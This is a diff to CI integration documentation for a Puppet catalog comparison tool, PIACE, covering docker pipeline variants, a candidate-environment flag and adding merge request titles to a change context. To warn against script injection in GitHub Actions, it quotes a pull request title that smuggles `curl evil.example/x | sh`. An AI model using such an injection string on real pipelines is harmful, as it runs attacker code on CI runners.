@@ -5,10 +5,17 @@ files out. The work is not in the invocation, it is in deciding what lives in
 the repository, what is injected per job, and what must never touch either.
 That decision gets sharper the less you control the runner.
 
-Working pipelines to copy: [`examples/ci/github-actions.yml`](../examples/ci/github-actions.yml)
-and [`examples/ci/gitlab-ci.yml`](../examples/ci/gitlab-ci.yml), with the
-services template they render,
-[`examples/ci/services.yaml.tmpl`](../examples/ci/services.yaml.tmpl).
+Working pipelines to copy: [`examples/ci/github-actions.yml`](../examples/ci/github-actions.yml),
+[`examples/ci/gitlab-ci.yml`](../examples/ci/gitlab-ci.yml) and
+[`examples/ci/azure-pipelines.yml`](../examples/ci/azure-pipelines.yml), with
+the services template they render,
+[`examples/ci/services.yaml.tmpl`](../examples/ci/services.yaml.tmpl). Each has
+a `-docker` twin
+([`examples/ci/github-actions-docker.yml`](../examples/ci/github-actions-docker.yml),
+[`examples/ci/gitlab-ci-docker.yml`](../examples/ci/gitlab-ci-docker.yml),
+[`examples/ci/azure-pipelines-docker.yml`](../examples/ci/azure-pipelines-docker.yml))
+that runs the published image with `docker run` instead of downloading and
+verifying a binary; those need a Docker daemon reachable from the runner.
 
 ## The shape
 
@@ -66,8 +73,9 @@ mirrored binary is the whole install.
 distroless: no shell, no `git`, and its entrypoint is the binary. GitLab's
 docker executor runs a job script by passing `sh` or `bash` to the image, and
 GitHub Actions `container:` jobs likewise expect a shell in the image, so
-neither can use it as a job image. It is built for `docker run` on a workstation, a Kubernetes Job, or
-a step on a runner where you already have a Docker socket:
+neither can use it as a job image. It is built for `docker run` on a
+workstation, a Kubernetes Job, or a step on a runner where you already have a
+Docker socket:
 
 ```sh
 docker run --rm \
@@ -82,13 +90,23 @@ docker run --rm \
 Render the services template with `@PIACE_RUN@` set to `/run/piace` in that
 case: the paths in it are resolved inside the container.
 
+Each binary pipeline sample above has a `-docker` twin that runs this exact
+form on its provider: [`examples/ci/github-actions-docker.yml`](../examples/ci/github-actions-docker.yml),
+[`examples/ci/gitlab-ci-docker.yml`](../examples/ci/gitlab-ci-docker.yml) and
+[`examples/ci/azure-pipelines-docker.yml`](../examples/ci/azure-pipelines-docker.yml).
+Change-context still runs on the runner, so those images carry git and bash
+too; only the `piace` invocations go into the container. The GitLab twin
+counts on a runner that exposes the Docker socket to the job rather than on
+the `docker:dind` service, because the DinD daemon lives in its own container
+and cannot see the checkout's bind-mount paths.
+
 ## Where each file goes
 
 Committed to the control repository, under one directory:
 
 | Path | What it is | Why it is committed |
 | --- | --- | --- |
-| `ci/piace/targets.yaml` | Which nodes, which environments, what to exclude and redact | It is policy. A change to an exclusion rule belongs in a review diff |
+| `ci/piace/targets.yaml` | Which nodes, which baseline environment, what to exclude and redact. Not the candidate environment: that is `--candidate-environment` on the job's `compare` line | It is policy. A change to an exclusion rule belongs in a review diff |
 | `ci/piace/services.yaml.tmpl` | Endpoints, and the TLS paths as `@PIACE_RUN@` placeholders | Endpoints are not secrets, and a changed endpoint should be reviewed |
 | `ci/piace/services-explain.yaml` | The `inference:` section only, token referenced by `token_env` | No secret in it; `compare` cannot see it |
 | `ci/piace/policy-notes.md` | Site policy handed to the model | Reviewable, and capped at 4000 bytes |
@@ -101,7 +119,7 @@ when the job ends:
 | Path | What it is |
 | --- | --- |
 | `$PIACE_RUN/ca.pem`, `client.pem`, `client.key` | The catalog-reader identity, `0600` in a `0700` directory |
-| `$PIACE_RUN/services.yaml` | The rendered template |
+| `$PIACE_RUN/services.yaml` | The rendered services template |
 
 Produced by the run, in the workspace, uploaded as job artifacts:
 `report.json`, `report.html`, `assessment.json`.
@@ -125,6 +143,51 @@ exactly when that bites: `baseline.file` and `facts.file` resolve against the
 file's** directory. That last one is why `services-explain.yaml` is committed
 next to `policy-notes.md` and rendered from nothing: it can then name the
 notes file relatively and stay correct.
+
+### Why the targets file is not a template
+
+`candidate.environment` names the environment CI deployed for this change,
+which is the one per-pipeline value in an otherwise static policy file. The
+environment maps to the compiler by branch name: the branch the merge request
+originates from is the environment the compiler has deployed, so pass
+`${CI_MERGE_REQUEST_SOURCE_BRANCH_NAME}`, not the merge request number.
+`compare` takes it as a flag, so the file does not have to carry it:
+
+```sh
+piace compare --targets ci/piace/targets.yaml \
+  --candidate-environment "${CI_MERGE_REQUEST_SOURCE_BRANCH_NAME}" ...
+```
+
+A branch name is not always a Puppet environment name. Environments cannot
+contain a dash, and r10k deploys `feature-x`, when configured to, as the
+environment `feature_x`. Rewrite dashes the same way before passing so the
+requested environment equals the one deployed:
+
+```sh
+candidate_environment="$(printf '%s' "${CI_MERGE_REQUEST_SOURCE_BRANCH_NAME}" | tr '-' '_')"
+piace compare --targets ci/piace/targets.yaml \
+  --candidate-environment "$candidate_environment" ...
+```
+
+Apply whatever mapping your deploy tooling actually applies, not one invented
+here: the rewrite exists only to keep the requested environment equal to the
+one the compiler has.
+
+The flag overrides `candidate.environment` for every target, both the
+`defaults:` block and any per-target `candidate:` block, and when it is given
+the file may omit the field entirely. Committing a placeholder and `sed`-ing
+it in the job would work too, but then the job mutates a tracked file and what
+a reviewer approved is not quite what ran. The value belongs to the
+invocation, so it is passed at the invocation.
+
+That also keeps the targets file where it is. `baseline.file` and
+`facts.file` resolve against the **target file's** directory, so a targets
+file rendered into a per-job directory the way the services file is takes its
+snapshot paths with it and stops finding them.
+
+`piace capture catalog --environment` is a different flag with a different
+meaning: it names the environment to *snapshot*, typically the production
+baseline, and it is deliberately not the candidate environment under test.
 
 ### Why credentials never go in the checkout
 
@@ -156,6 +219,65 @@ Read [`examples/change-context.yaml`](../examples/change-context.yaml) before
 enabling it. A change context is forwarded to the inference service exactly as
 written and is **not** pseudonymized: PIACE cannot tell which words in a merge
 request description are node names.
+
+### Title and description are the caller's to add
+
+`change-context.sh` emits `base_ref`, `head_ref`, commit subjects and changed
+paths, and stops. It does not emit `title` or `description`, because git does
+not have them: they belong to the merge request or pull request, and only the
+CI system knows them. Pipe the generator straight into `explain --change` and
+the assessment goes out with commit subjects and file paths but nothing that
+says what the change is *for*, which is usually the most useful sentence a
+reviewer ever wrote about it. Append them yourself:
+
+```sh
+{
+  printf '  title: |\n'
+  printf '%s\n' "$CI_MERGE_REQUEST_TITLE"       | sed 's/^/    /'
+  printf '  description: |\n'
+  printf '%s\n' "$CI_MERGE_REQUEST_DESCRIPTION" | sed 's/^/    /'
+} >> change-context.yaml
+```
+
+A literal block scalar rather than a quoted string, because a description is
+multi-line and a title routinely contains a colon.
+
+On GitHub the same two values must reach the script through `env:`, never
+through `${{ }}` inside the `run:` block. `${{ }}` is substituted into the
+script text *before* a shell ever sees it, so a pull request titled
+`"; curl evil.example/x | sh; #` runs on your runner, and a pull request title
+is attacker-supplied by definition. The base ref goes the same way, because a
+git branch name may legally contain `;`, `$` and a backtick.
+
+```yaml
+- name: Describe the change
+  env:
+    BASE_REF: ${{ github.base_ref }}
+    PR_TITLE: ${{ github.event.pull_request.title }}
+    PR_BODY: ${{ github.event.pull_request.body }}
+  run: |
+    ci/piace/change-context.sh "origin/$BASE_REF" HEAD > change-context.yaml
+    {
+      printf '  title: |\n'
+      printf '%s\n' "$PR_TITLE" | sed 's/^/    /'
+      printf '  description: |\n'
+      printf '%s\n' "$PR_BODY"  | sed 's/^/    /'
+    } >> change-context.yaml
+```
+
+On GitLab the equivalent variables are expanded by the shell in the running
+job rather than substituted into it, so ordinary quoting is the whole defence.
+
+On Azure Pipelines the agent macro-expands `$( ... )` in task inputs, script
+text included, before a shell runs. That mirrors GitHub's substitution in
+reverse: untrusted values reach scripts only through `env:`, and the scripts
+themselves must avoid shell command substitution, which uses the same token.
+Azure also has no title or description variables, so the Azure example takes
+them from the pull request REST API instead.
+
+PIACE caps the title at 200 bytes and the description at 4000. Over-cap text
+is truncated, the truncation is recorded and shown, and it never fails the
+command.
 
 ## On a runner you do not fully control
 
